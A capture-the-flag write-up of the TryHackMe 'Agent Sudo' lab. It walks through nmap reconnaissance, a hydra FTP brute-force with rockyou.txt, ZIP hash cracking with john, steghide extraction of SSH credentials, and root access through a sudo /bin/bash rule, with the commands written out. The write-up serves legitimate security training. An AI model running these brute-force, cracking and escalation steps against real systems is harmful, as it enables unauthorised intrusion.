# TryHackMe - Agent Sudo Writeup

## Target IP: 
`10.10.120.249`

---

## Phase 1: Reconnaissance

Initial port scanning was performed using `nmap` to identify exposed services on the target:

```bash
nmap -sV -Pn 10.10.120.249
```

**Open Ports Identified:**

- **21** – FTP (vsftpd)
    
- **22** – OpenSSH
    
- **80** – HTTP
    

---

## Phase 2: Enumeration

### Web Enumeration (Port 80):

- Navigating the HTTP service revealed a character referred to as **Agent C**.
    
- Using **Burp Suite**, we modified the `User-Agent` header and confirmed that the username `chris` was associated with FTP access.
    

### FTP Brute-force:

We used `hydra` to brute-force the FTP login for user `chris` using the **rockyou.txt** wordlist:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.120.249
```

Successful credentials were obtained, granting FTP access to the target machine.

---

## Phase 3: Exploitation

### FTP Access:

Login was established using:

```bash
ftp 10.10.120.249
```

Multiple files were downloaded using the `mget` command. One of the files, `cutie.png`, appeared suspicious.

### Metadata & File Analysis:

- **Exiftool** was used to inspect metadata:
    
    ```bash
    exiftool cutie.png
    ```
    
- A warning in the metadata prompted further analysis via a hex dump:
    
    ```bash
    xxd cutie.png | less
    ```
    
- Hidden data was extracted using **binwalk**:
    
    ```bash
    binwalk -e cutie.png
    ```
    
- This revealed a ZIP archive (`8702.zip`) that required a password. We prepared the archive for cracking:
    
    ```bash
    zip2john 8702.zip > hash.txt
    john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
    ```
    
- Once cracked, the ZIP contained a message that was decoded using **CyberChef**, revealing the string: `Area51`.
    

### Steganography:

Using the password `Area51`, we extracted hidden data from `cute-alien.jpg`:

```bash
steghide extract -sf cute-alien.jpg
```

This yielded credentials for a new user:

- **Username:** james
    
- **Password:** hackerrules!
    

### SSH Access:

SSH login was successful using the above credentials:

```bash
ssh james@10.10.120.249
```

A file of interest, `Alien_autospy.jpg`, was discovered. It was transferred to the local machine:

```bash
scp james@10.10.120.249:Alien_autospy.jpg ~/
```

A reverse image search revealed it to be the infamous **Roswell alien autopsy**, hinting at a potential theme or additional clues.

---

## Phase 4: Privilege Escalation

Running the following command:

```bash
sudo -l
```

Revealed that user `james` could execute `/bin/bash` with root privileges:

```bash
User james may run the following commands on [target]:
    (ALL : ALL) NOPASSWD: /bin/bash
```

This allowed for immediate privilege escalation:

```bash
sudo /bin/bash
```

A root shell was obtained to allow us to get the flag.
